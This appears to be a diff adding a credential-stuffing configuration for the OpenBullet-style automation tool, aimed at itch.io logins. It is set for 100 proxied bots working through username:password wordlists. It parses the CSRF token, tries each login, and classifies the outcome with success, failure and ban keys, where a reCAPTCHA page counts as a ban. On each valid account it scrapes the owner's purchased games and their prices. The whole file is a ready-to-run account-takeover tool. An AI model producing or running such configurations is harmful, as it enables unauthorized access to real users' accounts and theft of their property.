@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "Itch.io",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-15T00:10:27.8407871+00:00",
+  "AdditionalInfo": "Even if site allows mails, don't use mails",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://itch.io/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_CSRF PARSE "<SOURCE>" CSS "[name=csrf_token]" "value" 0 -> VAR "CSRF" "" "" 
+#LOGIN REQUEST POST "https://itch.io/login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://itch.io" 
+  HEADER "referer: https://itch.io/login" 
+  HEADER "ref%3Aregister%3Aaction: header" 
+  HEADER "ref%3aregister%3areferrer: https%3a%2f%2fitch%2eio%2f" 
+  HEADER "ref%3Aregister%3Apage_params: index" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "logout" 
+  KEYCHAIN Failure OR 
+    KEY "Please enter the code shown on your authenticator" 
+    KEY "please check your email to continue" 
+    KEY "Incorrect username or password" 
+  KEYCHAIN Ban OR 
+    KEY "Please complete reCAPTCHA" 
+  KEYCHAIN Retry OR 
+    KEY "mismatch" 
+#GET_PURCHASES REQUEST GET "https://itch.io/my-purchases" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#CAPTURE_GAMES PARSE "<SOURCE>" LR "title\" data-action=\"game_grid\">" "</a>" Recursive=TRUE -> CAP "Game" "" "" 
+#CAPTURE_PRICES PARSE "<SOURCE>" LR "<div class=\"price_value\">" "</div>" Recursive=TRUE -> CAP "Price" "" "" 
